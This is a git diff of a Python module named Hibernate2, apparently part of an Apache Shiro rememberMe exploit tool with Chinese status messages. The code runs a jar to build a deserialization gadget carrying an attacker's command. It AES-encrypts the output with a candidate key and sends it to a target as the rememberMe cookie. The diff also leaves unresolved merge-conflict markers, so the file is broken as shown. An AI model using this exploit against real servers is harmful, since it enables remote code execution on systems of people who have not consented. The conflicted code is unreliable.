@@ -21,6 +21,7 @@ class Hibernate2(object):
         self.sendPayload(url,command,resKey)
 
 
+<<<<<<< HEAD
     def gcm_encode(self,resKey,file_body):
 
         mode = AES.MODE_GCM
@@ -45,11 +46,17 @@ class Hibernate2(object):
 
     def sendPayload(self,url,command,resKey,fp=JAR_FILE):
 
+=======
+    def sendPayload(self,url,command,resKey,fp=JAR_FILE):
+        key = resKey
+        target = url
+>>>>>>> db206e0e1860fd7668d96871efc5c28349d93b1a
         if not os.path.exists(fp):
             raise Exception('jar file not found!')
         popen = subprocess.Popen(['java', '-jar', fp, 'Hibernate2', command],       #popen
                                     stdout=subprocess.PIPE)
         BS = AES.block_size
+<<<<<<< HEAD
         pad = lambda s: s + ( (BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
         file_body = pad(popen.stdout.read())         #受popen影响的file_body
 
@@ -69,7 +76,30 @@ class Hibernate2(object):
                 print("[+]   ****Hibernate2模块   key: {} 已成功发送！  状态码:{}".format(str(resKey),str(x.status_code)))
             else:
                 print("[-]   ****Hibernate2模块   key: {} 发送异常！    状态码:{}".format(str(resKey),str(x.status_code)))
+=======
+        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+        mode = AES.MODE_CBC
+        iv = uuid.uuid4().bytes
+        encryptor = AES.new(base64.b64decode(key), mode, iv)   #受key影响的encryptor
+        file_body = pad(popen.stdout.read())         #受popen影响的file_body
+        payload = base64.b64encode(iv + encryptor.encrypt(file_body))
+        header={
+            'User-agent' : 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;'
+            }
+        try:
+            r = requests.get(target,  headers=header, cookies={'rememberMe': payload.decode()+"="},verify=False, timeout=20)  # 发送验证请求1
+            #print("payload1已完成,字段rememberMe:看需要自己到源代码print "+payload.decode())
+            if(r.status_code==200):
+ 
+                print("[+]   ****Hibernate2模块   key: {} 已成功发送！  状态码:{}".format(str(key),str(r.status_code)))
+            else:
+                print("[-]   ****Hibernate2模块   key: {} 发送异常！    状态码:{}".format(str(key),str(r.status_code)))
+>>>>>>> db206e0e1860fd7668d96871efc5c28349d93b1a
         except Exception as e:
             print(e)
             return False
 
+<<<<<<< HEAD
+=======
+
+>>>>>>> db206e0e1860fd7668d96871efc5c28349d93b1a
